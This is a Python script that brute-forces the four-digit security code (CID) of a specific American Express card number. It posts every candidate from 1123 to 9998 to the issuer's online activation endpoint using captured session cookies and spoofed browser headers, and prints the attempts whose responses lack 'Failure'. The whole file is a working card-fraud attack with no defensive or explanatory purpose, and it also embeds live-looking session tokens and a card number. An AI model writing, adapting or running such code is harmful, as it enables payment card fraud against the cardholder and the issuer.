import requests

cookies = {
    'agent-id': 'f92a5406-0c79-44c5-a5fd-980901611b29',
    'ak_bmsc': 'FDB8F04A753BB01F43862DCA55618684~000000000000000000000000000000~YAAQlPTVF0ad/WKRAQAAPyR1ZRi6m2QgREcQep87DaN8b5ecoJpAYJM3Rmpdad/uvmCGcjLAvpoRTVHaXlqc0SH+CZoWOFoSlC/ciAtVsLk0sIzyE7DLlDyNELfuuNzMa+ouFaLyNjWebXjlAkY5PSg+UmmCLiNlaRk9Dnjrn97OrjcK17kPKjM35FsXNxdi5qTi70ZgXl7K3jTUAElBaBdj/4Asqw2zldIMiJU9AUnhyw05kBvybaggEzJJxpJ12LjsrTuR3v2BqQmoqyqwUTQHK8iWoS6LRtfqExDaFDph9MGNXab7gYzVX+Xc3lHUnQ6imO5vgpScnP5grjiYEyWqlNt3nmP06A21OyDK3AAQ5dqe+urGue6pC1Zrma9qOke66vvsZb9ERltIBqJ4DdlZ',
    'bm_sz': '1C89131E413E871EC7C2CDB6CD752964~YAAQlPTVF0id/WKRAQAAPyR1ZRgVaKqbDTEu2ePmmXI5DPORNP2hPPu4Yv93pLpxtmGBm1OnPmLMdO4/rJaVsZYjEs6YMwMC1dMzMsIohwEFoG2ySmRx37WsWA97JPU4rhJt+mGx33/kG0CRo9B29OSbR9JLgGvxPLZ49/yypWnCToKjO6Piox9SjZMMFUnE2Kvw25zJS7edCf0SJKQxouIrI5ytHU5cAuObc24+5prD2uiT9vMDHQJdNLiOEB2DBhYoCTJcVnJ8FbIeixSFV3h521kDs6ZfPLuqAGPEistsRHmjcwhQTNbc+ZjU07ct9xEeyAUYVBcWrrrDugLZGDtszBgwZrKMMF6JN5rxTV6XOGHfBegCpond9ppqVjCzeurjTwf2ld76x4dkGx69lNZyhx0wwg==~3551537~3420212',
    '_abck': 'B1859BCD9519E564D35F2B755C2FA1E2~0~YAAQlPTVF4yd/WKRAQAA1Sh1ZQxmeW+3W3Y3b55675ZtkrVivqdt7GTILgXBkYw7xtPD8YwAeF/DYTYriwwyPlKRVSFWtr0TjIiqs+xHKJbIi2v7JHpUpR5csn0vPcYSx0zH3zM6OyhNy0rgCPEM3+ewPozSwQqje3jvlP6YSw7Ox4/yJ1WeKfvHSvLjAXGil1AH7CxT6RY6yQa5v7ofdP17ZUmn5lSeNZqXMtO1PDvlvQl/Gqjc604S6WhvoVpP6ZbTuNOcTevWb7GuDbptXQfVwNVGnzNnhGCQ0lBkP675lH6CsbMFBQa5CLeaPegjuShfuxovw5v5OtRnNC3/5M1feGYpPy5fKZQAQ9z/gdgzDqTEosupHR8K6oHw9RUp+l6MVt/8nNR+pLmGDPPBcJCtJsD9C0Qn0gKN5SA2xYkgXA==~-1~||0||~-1',
    'TS0139a03f': '0144d4a8397a968a0a28f3ebcfa23de563e642817481957824886d3bc87a8ac8c412d3741a22f03baf006e08856cadfd4ad74752b7',
    'AMCV_5C36123F5245AF470A490D45%40AdobeOrg': '359503849%7CMCMID%7C92159548916303748412379447571481945225%7CMCAID%7CNONE%7CvVersion%7C5.0.1',
    's_sess': '%20s_dedupeCM%3Dn%257CUS%253Abing.comn%257CUS%253Abing.combing.comn%257Cundefinedn%252Fa%3B%20s_cpc%3D1%3B%20s_cc%3Dtrue%3B%20om_ser_ttc%3D1723984066974%3B%20s_tp%3D1521%3B%20s_ppv%3DUS%25257CAMEX%25257CSer%25257COCE%25257CCardInput%252C60%252C60%252C914%3B',
    's_pers': '%20s_tbm%3Dtrue%7C1723985864293%3B%20gpv_v41%3DUS%257CAMEX%257CSer%257COCE%257CCardInput%7C1723985895880%3B',
    'akaalb_online': '1723984696~op=online_oce_LBM:oce-e3-epaas|~rv=33~m=oce-e3-epaas:0|~os=2e70727914d29b5f6fe52924ba46bd9f~id=6e4155fb96e252605f80bf12fda96fd2',
    'bm_sv': '17DFB09BBC049DF7741462611D469ADD~YAAQlPTVF/am/WKRAQAAWa51ZRhnKqwSgl8YC4/1U3pJ01FDlICTx/G8G9HRoiWtl11NbmRtmOkmVQS2g6yxlF4Ob7arpCdGv4uZzHL+SVUqf6y+wE0M6XaV2+RtwLZayo2Q+rQ0RVxkQi3k5lvPGwAKNv8el+INbGCs7u1Q5bUWQlffxGk2JQC9ygevc5S22t5sS/p0C0Ih8z4zeTR8ApneqyYH/zhWTyweMjXMNHSCKZnlVSJHxGp5/eIFV7vpOU91UsQnKD8N~1',
}

headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/json;charset=UTF-8',
    # 'cookie': 'agent-id=f92a5406-0c79-44c5-a5fd-980901611b29; ak_bmsc=FDB8F04A753BB01F43862DCA55618684~000000000000000000000000000000~YAAQlPTVF0ad/WKRAQAAPyR1ZRi6m2QgREcQep87DaN8b5ecoJpAYJM3Rmpdad/uvmCGcjLAvpoRTVHaXlqc0SH+CZoWOFoSlC/ciAtVsLk0sIzyE7DLlDyNELfuuNzMa+ouFaLyNjWebXjlAkY5PSg+UmmCLiNlaRk9Dnjrn97OrjcK17kPKjM35FsXNxdi5qTi70ZgXl7K3jTUAElBaBdj/4Asqw2zldIMiJU9AUnhyw05kBvybaggEzJJxpJ12LjsrTuR3v2BqQmoqyqwUTQHK8iWoS6LRtfqExDaFDph9MGNXab7gYzVX+Xc3lHUnQ6imO5vgpScnP5grjiYEyWqlNt3nmP06A21OyDK3AAQ5dqe+urGue6pC1Zrma9qOke66vvsZb9ERltIBqJ4DdlZ; bm_sz=1C89131E413E871EC7C2CDB6CD752964~YAAQlPTVF0id/WKRAQAAPyR1ZRgVaKqbDTEu2ePmmXI5DPORNP2hPPu4Yv93pLpxtmGBm1OnPmLMdO4/rJaVsZYjEs6YMwMC1dMzMsIohwEFoG2ySmRx37WsWA97JPU4rhJt+mGx33/kG0CRo9B29OSbR9JLgGvxPLZ49/yypWnCToKjO6Piox9SjZMMFUnE2Kvw25zJS7edCf0SJKQxouIrI5ytHU5cAuObc24+5prD2uiT9vMDHQJdNLiOEB2DBhYoCTJcVnJ8FbIeixSFV3h521kDs6ZfPLuqAGPEistsRHmjcwhQTNbc+ZjU07ct9xEeyAUYVBcWrrrDugLZGDtszBgwZrKMMF6JN5rxTV6XOGHfBegCpond9ppqVjCzeurjTwf2ld76x4dkGx69lNZyhx0wwg==~3551537~3420212; _abck=B1859BCD9519E564D35F2B755C2FA1E2~0~YAAQlPTVF4yd/WKRAQAA1Sh1ZQxmeW+3W3Y3b55675ZtkrVivqdt7GTILgXBkYw7xtPD8YwAeF/DYTYriwwyPlKRVSFWtr0TjIiqs+xHKJbIi2v7JHpUpR5csn0vPcYSx0zH3zM6OyhNy0rgCPEM3+ewPozSwQqje3jvlP6YSw7Ox4/yJ1WeKfvHSvLjAXGil1AH7CxT6RY6yQa5v7ofdP17ZUmn5lSeNZqXMtO1PDvlvQl/Gqjc604S6WhvoVpP6ZbTuNOcTevWb7GuDbptXQfVwNVGnzNnhGCQ0lBkP675lH6CsbMFBQa5CLeaPegjuShfuxovw5v5OtRnNC3/5M1feGYpPy5fKZQAQ9z/gdgzDqTEosupHR8K6oHw9RUp+l6MVt/8nNR+pLmGDPPBcJCtJsD9C0Qn0gKN5SA2xYkgXA==~-1~||0||~-1; TS0139a03f=0144d4a8397a968a0a28f3ebcfa23de563e642817481957824886d3bc87a8ac8c412d3741a22f03baf006e08856cadfd4ad74752b7; AMCV_5C36123F5245AF470A490D45%40AdobeOrg=359503849%7CMCMID%7C92159548916303748412379447571481945225%7CMCAID%7CNONE%7CvVersion%7C5.0.1; s_sess=%20s_dedupeCM%3Dn%257CUS%253Abing.comn%257CUS%253Abing.combing.comn%257Cundefinedn%252Fa%3B%20s_cpc%3D1%3B%20s_cc%3Dtrue%3B%20om_ser_ttc%3D1723984066974%3B%20s_tp%3D1521%3B%20s_ppv%3DUS%25257CAMEX%25257CSer%25257COCE%25257CCardInput%252C60%252C60%252C914%3B; s_pers=%20s_tbm%3Dtrue%7C1723985864293%3B%20gpv_v41%3DUS%257CAMEX%257CSer%257COCE%257CCardInput%7C1723985895880%3B; akaalb_online=1723984696~op=online_oce_LBM:oce-e3-epaas|~rv=33~m=oce-e3-epaas:0|~os=2e70727914d29b5f6fe52924ba46bd9f~id=6e4155fb96e252605f80bf12fda96fd2; bm_sv=17DFB09BBC049DF7741462611D469ADD~YAAQlPTVF/am/WKRAQAAWa51ZRhnKqwSgl8YC4/1U3pJ01FDlICTx/G8G9HRoiWtl11NbmRtmOkmVQS2g6yxlF4Ob7arpCdGv4uZzHL+SVUqf6y+wE0M6XaV2+RtwLZayo2Q+rQ0RVxkQi3k5lvPGwAKNv8el+INbGCs7u1Q5bUWQlffxGk2JQC9ygevc5S22t5sS/p0C0Ih8z4zeTR8ApneqyYH/zhWTyweMjXMNHSCKZnlVSJHxGp5/eIFV7vpOU91UsQnKD8N~1',
    'origin': 'https://online.americanexpress.com',
    'priority': 'u=1, i',
    'referer': 'https://online.americanexpress.com/myca/gce/us/action/home?request_type=un_activation&Face=en_US',
    'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Microsoft Edge";v="128"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0',
}

params = {
    'request_type': 'un_Register',
    'Face': 'en_US',
    'OFFLINE': 'N',
}

json_data = {
    "card": {
        "accountNo": "379431996641007",
        "cid": "",
        "postalCode": "",
    },
}

import time

for cid in range(1123, 9999):
    time.sleep(0.5)
    json_data["card"]["cid"] = f"{cid:04d}"

    response = requests.post(
        "https://online.americanexpress.com/myca/gce/us/action/activate",
        params=params,
        cookies=cookies,
        headers=headers,
        json=json_data,
    )

    print(f"CID: {json_data['card']['cid']}, Status Code: {response.status_code}")

    if 'Failure' not in response.text:
        print('**********')
        
    # Optional: Add a condition to break the loop if successful
    # if response.status_code == 200:
    #     print("Successful activation")
    #     break
